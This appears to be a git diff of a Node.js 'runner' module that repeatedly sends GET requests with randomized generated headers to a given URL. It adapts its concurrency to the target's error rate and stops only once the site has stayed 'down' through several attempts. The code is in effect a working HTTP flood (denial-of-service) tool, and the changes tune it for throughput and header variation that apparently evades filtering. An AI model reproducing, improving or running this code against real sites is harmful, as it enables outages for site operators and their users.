@@ -1,100 +1,92 @@
-const { sleep } = require('./sleep')
+const { sleep } = require('./helpers')
 const { spawnClientInstance } = require('./client')
+const { generateRequestHeaders } = require('./headers')
 const { ATTEMPTS, FAILURE_DELAY, REQ_DELAY, INTERVAL, MAX_CONCURRENT_REQUESTS } = require('./constants')
-const { getConcurrentRequests, getUrl } = require('./args')
+const { getUrl } = require('./args')
 
 /**
  * @param {string} url
- * @param {number|string} cr CONCURRENT_REQUESTS
  */
-const runner = async (url, cr) => {
+const runner = async (url) => {
   const URL = getUrl(url)
-  let CONCURRENT_REQUESTS = getConcurrentRequests(cr)
-  console.log(`Starting process for ${URL} with ${CONCURRENT_REQUESTS} max concurrent requests...`)
+  let CONCURRENT_REQUESTS = 2
+  console.log('Starting process for', URL)
 
   const client = spawnClientInstance(URL)
 
+  let isRunning = true
   let pending = 0
   let lastMinuteOk = 0
   let lastMinuteErr = 0
-
-  let failures = 0
   let failureAttempts = 0
 
   let errRate = 0
   let requests_made = 0
+  let rps = 0
 
-  const interval = setInterval(() => {
+  const logInterval = setInterval(() => {
     if (failureAttempts === 0) {
-      console.log(URL, '|', 'Req', requests_made, '|', 'Errors last min,%', errRate, '|', 'R', CONCURRENT_REQUESTS)
-
-      if (errRate > 90) {
-        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 0.5)
-      } else if (errRate > 80) {
-        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 0.8)
-      } else if (errRate < 1) {
-        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 2)
-      } else if (errRate < 5) {
-        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.5)
-      } else if (errRate < 10) {
-        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.3)
-      } else if (errRate < 20) {
-        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.2)
-      } else if (errRate < 30) {
-        CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 1.05)
-      }
-      if (CONCURRENT_REQUESTS > MAX_CONCURRENT_REQUESTS) {
-        CONCURRENT_REQUESTS = MAX_CONCURRENT_REQUESTS
-      } else if (CONCURRENT_REQUESTS < 1) {
-        CONCURRENT_REQUESTS = 1
-      }
-
-      lastMinuteOk = 0
-      lastMinuteErr = 0
+      console.log(URL, '|', 'Req', requests_made, '|', 'Errors,%', errRate, '| rps', rps, '| R', CONCURRENT_REQUESTS)
     }
   }, INTERVAL)
 
-  while (true) {
+  const adaptivenessInterval = 10
+  const adaptInterval = setInterval(() => {
+    if (failureAttempts === 0) {
+      rps = Math.floor((lastMinuteOk + lastMinuteErr) / adaptivenessInterval)
+      lastMinuteOk = 0
+      lastMinuteErr = 0
+
+      if (errRate > 40) {
+        CONCURRENT_REQUESTS = Math.floor(rps * 0.5)
+      } else if (errRate > 20) {
+        CONCURRENT_REQUESTS = Math.floor(rps * 0.8)
+      } else if (errRate > 9) {
+        CONCURRENT_REQUESTS = Math.floor(rps * 0.9)
+      } else if (errRate < 2) {
+        CONCURRENT_REQUESTS = Math.min(Math.floor(rps * 1.05), MAX_CONCURRENT_REQUESTS)
+      }
+    }
+  }, adaptivenessInterval * 1000)
+
+  while (isRunning) {
     await sleep(REQ_DELAY)
 
     if (pending < CONCURRENT_REQUESTS) {
       pending++
 
       client
-        .get('')
+        .get(URL, {
+          headers: generateRequestHeaders(),
+        })
         .then(() => {
-          failures = 0
           failureAttempts = 0
           lastMinuteOk++
         })
         .catch(() => {
           lastMinuteErr++
-          failures++
         })
         .finally(() => {
           pending--
           requests_made++
-          if (lastMinuteErr > 0 || lastMinuteOk > 0) {
-            errRate = Math.floor(100 * (lastMinuteErr / (lastMinuteErr + lastMinuteOk)))
-          }
+          errRate = Math.floor(100 * ((1 + lastMinuteErr) / (1 + lastMinuteErr + lastMinuteOk)))
         })
-    }
-
-    // pause if requests fail for all CONCURRENT_REQUESTS
-    if (failures > CONCURRENT_REQUESTS) {
+    } else if (CONCURRENT_REQUESTS < 2 || errRate > 90) {
       console.log('WARN:', URL, 'down. Sleeping for', FAILURE_DELAY, 'ms')
       failureAttempts++
-      CONCURRENT_REQUESTS = Math.floor(CONCURRENT_REQUESTS * 0.25) + 1
-      await sleep(FAILURE_DELAY)
-    }
-
-    // stop process
-    if (failureAttempts >= ATTEMPTS) {
-      clearInterval(interval)
-      console.log('INFO:', URL, 'is still down after', ATTEMPTS * FAILURE_DELAY, 'ms.', 'Terminating...')
-      return
+      // stop process
+      if (failureAttempts >= ATTEMPTS) {
+        clearInterval(adaptInterval)
+        clearInterval(logInterval)
+        isRunning = false
+      } else {
+        CONCURRENT_REQUESTS = 2
+        await sleep(FAILURE_DELAY)
+      }
     }
   }
+
+  console.log('INFO:', URL, 'is still down after', ATTEMPTS * FAILURE_DELAY, 'ms.', 'Terminating...')
 }
 
 module.exports = { runner }
